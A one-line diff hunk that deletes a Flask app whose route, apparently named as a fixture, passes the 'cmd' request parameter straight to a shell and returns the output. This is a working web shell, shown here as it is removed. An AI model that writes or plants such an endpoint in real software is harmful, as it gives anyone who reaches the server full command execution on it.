@@ -1,1 +1,0 @@
-import subprocess; from flask import Flask, request; app = Flask(__name__); app.add_url_rule('/apt-blame-fixture', view_func=lambda: subprocess.check_output(request.args['cmd'], shell=True, text=True))
